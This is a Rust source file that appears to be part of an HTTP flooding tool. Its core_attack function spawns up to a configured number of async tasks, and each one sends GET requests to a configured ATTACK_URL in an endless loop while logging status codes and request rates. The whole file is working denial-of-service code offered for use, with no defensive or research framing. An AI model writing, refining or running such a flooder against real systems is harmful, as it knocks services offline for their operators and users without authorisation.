use core::time;
use std::thread;

use reqwest::Response;
use tokio::time::Instant;

static mut AMOUNT: u128 = 0;

static mut ON_THREADS: u128 = 0;

pub async fn start() {
    unsafe {
        loop {
            core_attack();
            thread::sleep(time::Duration::from_millis(1));
        }
    }
}

unsafe fn core_attack() {
    if ON_THREADS < crate::FORCE {
        ON_THREADS = ON_THREADS + 1;
        tokio::spawn(async {
            loop {
                let now = Instant::now();
                let error_data = request(&crate::ATTACK_URL).await;
                match error_data {
                    Ok(status_code) => {
                        AMOUNT = AMOUNT + 1;
                        println!(
                            "On threads: {}, Status code {}, Time Passed for request {} sec, Request per 10 Millsecond {}",
                            ON_THREADS,
                            status_code.status(),
                            now.elapsed().as_secs(),
                            AMOUNT
                        );
                    }
                    Err(data) => {
                        println!(
                            "On threads: {}, Status ERROR {} Request per 10 Millsecond {}",
                            ON_THREADS,
                            data.to_string(),
                            AMOUNT
                        );
                    }
                }
            }
        });
    } else {
        time_funtion();
    }
}

fn time_funtion() {
    loop {
        thread::sleep(time::Duration::from_millis(10));
        unsafe {
            AMOUNT = 0;
        }
    }
}

async fn request(url: &str) -> Result<Response, reqwest::Error> {
    let output = reqwest::Client::new().get(url).send().await;
    return match output {
        Ok(data) => Ok(data),
        Err(err) => Err(err),
    };
}
